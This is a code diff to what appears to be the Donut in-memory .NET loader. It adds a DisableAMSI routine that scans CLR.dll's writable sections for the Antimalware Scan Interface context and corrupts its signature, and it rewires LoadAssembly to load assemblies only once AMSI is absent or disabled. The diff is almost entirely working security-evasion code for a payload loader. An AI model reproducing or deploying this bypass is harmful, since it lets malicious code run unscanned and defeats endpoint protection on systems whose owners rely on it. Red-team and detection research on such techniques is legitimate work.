@@ -108,8 +108,9 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     SAFEARRAYBOUND  sab;
     SAFEARRAY       *sa;
     DWORD           i;
-    BOOL            loadable;
+    BOOL            loaded=FALSE, loadable, amsi;
     PBYTE           p;
+    HMODULE         hAMSI;
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -195,21 +196,51 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
           sab.cElements = mod->len;
           sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
           
-          if(sa != NULL) {        
-            DPRINT("Copying assembly to safe array");
+          if(sa != NULL) {
+            DPRINT("AppDomain::Load_3");            
             
-            for(i=0, p=sa->pvData; i<mod->len; i++) {
-              p[i] = mod->data[i];
-            }
-            DPRINT("AppDomain::Load_3");
+            // AMSI is available since v4.8
+            // we assume it's disabled until a call to Load_3()
+            amsi = TRUE;
             
+            // the first call attempts to initialize AMSI
             hr = pa->ad->lpVtbl->Load_3(
-              pa->ad, sa, &pa->as);
-              
-            DPRINT("Erasing assembly from memory");
+              pa->ad, sa, &pa->as); 
+
+            DPRINT("HRESULT : %08lx", hr);
+
+            DPRINT("Checking for AMSI");
+            hAMSI = inst->api.GetModuleHandle(inst->amsi);
             
-            for(i=0, p=sa->pvData; i<mod->len; i++) {
-              p[i] = mod->data[i] = 0;
+            if(hAMSI != NULL) {
+              // we found it initialized by previous call to Load_3()
+              DPRINT("Detected AMSI");
+              // try to disable it
+              amsi = DisableAMSI(inst);
+              DPRINT("DisableAMSI %s", amsi ? "SUCCEEDED" : "FAILED");
+            }
+            // if AMSI isn't running or was disabled, copy the assembly and load
+            if(amsi) {
+              DPRINT("Copying assembly to safe array");
+              
+              for(i=0, p=sa->pvData; i<mod->len; i++) {
+                p[i] = mod->data[i];
+              }
+  
+              DPRINT("AppDomain::Load_3");
+              
+              hr = pa->ad->lpVtbl->Load_3(
+                pa->ad, sa, &pa->as);
+              
+              loaded = hr == S_OK;
+              
+              DPRINT("HRESULT : %08lx", hr);
+              
+              DPRINT("Erasing assembly from memory");
+              
+              for(i=0, p=sa->pvData; i<mod->len; i++) {
+                p[i] = mod->data[i] = 0;
+              }
             }
             DPRINT("SafeArrayDestroy");
             inst->api.SafeArrayDestroy(sa);
@@ -217,7 +248,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
         }
       }
     }
-    return SUCCEEDED(hr);
+    return loaded;
 }
     
 BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
@@ -438,6 +469,81 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     }
 }
 
+// attempt to disable AMSI by corrupting the AMSI context stored in CLR.dll
+// based on idea by Matt Graeber
+// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9
+//
+typedef struct tagAMSICONTEXT {
+  DWORD        Signature;          // "AMSI" or 0x49534D41
+  PWCHAR       AppName;            // stored by AmsiInitialize
+  IAntimalware CAmsiAntimalware;   // stored by AmsiInitialize
+  DWORD        SessionCount;       // increased by AmsiOpenSession
+} AMSICONTEXT, *PAMSICONTEXT;
+
+BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+    LPVOID                   hCLR;
+    BOOL                     disabled = FALSE;
+    PIMAGE_DOS_HEADER        dos;
+    PIMAGE_NT_HEADERS        nt;
+    PIMAGE_SECTION_HEADER    sh;
+    DWORD                    i, j, res;
+    PBYTE                    ds;
+    MEMORY_BASIC_INFORMATION mbi;
+    AMSICONTEXT              *ctx;
+    
+    DPRINT("Obtaining base address of CLR");
+    hCLR = inst->api.GetModuleHandle(inst->clr);
+    
+    if(hCLR != NULL) {
+      DPRINT("Locating .data section");
+      dos = (PIMAGE_DOS_HEADER)hCLR;  
+      nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos->e_lfanew);  
+      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
+             nt->FileHeader.SizeOfOptionalHeader);
+             
+      for(i = 0; 
+          i < nt->FileHeader.NumberOfSections && !disabled; 
+          i++) 
+      {
+        // if this section is writeable, assume it's data
+        if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+          DPRINT("Found writeable section %s", sh[i].Name);
+          // scan section for pointers to the heap
+          ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);
+          DPRINT("Virtual address is %p", ds);
+           
+          for(j = 0; 
+              j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
+              j += sizeof(ULONG_PTR)) 
+          {
+            // check if "AMSI" is present
+            ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
+            // query the pointer
+            res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
+            if(res != sizeof(mbi)) continue;
+            
+            // if it's a pointer to heap or stack
+            if ((mbi.State   == MEM_COMMIT    ) &&
+                (mbi.Type    == MEM_PRIVATE   ) && 
+                (mbi.Protect == PAGE_READWRITE))
+            {
+              ctx = (AMSICONTEXT*)ptr;
+              // check if it contains the signature 
+              if(ctx->Signature == *(DWORD*)&inst->amsi) {
+                DPRINT("Found AMSI signature at %p", (PVOID)&ds[j]);
+                // increment the value of signature
+                ctx->Signature++;
+                disabled = TRUE;
+                break;
+              }
+            }
+          }
+        }
+      }
+    }
+    return disabled;
+}
+
 /**
   Try download a module from HTTP server
   Uses HTTPS if required, but ignores invalid certificates
@@ -613,8 +719,6 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
 #endif
     return bResult;
 }
-
-#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)
 
 // locate address of API in export table
 LPVOID FindExport(PDONUT_INSTANCE inst, LPVOID base, ULONG64 api_hash, ULONG64 iv){
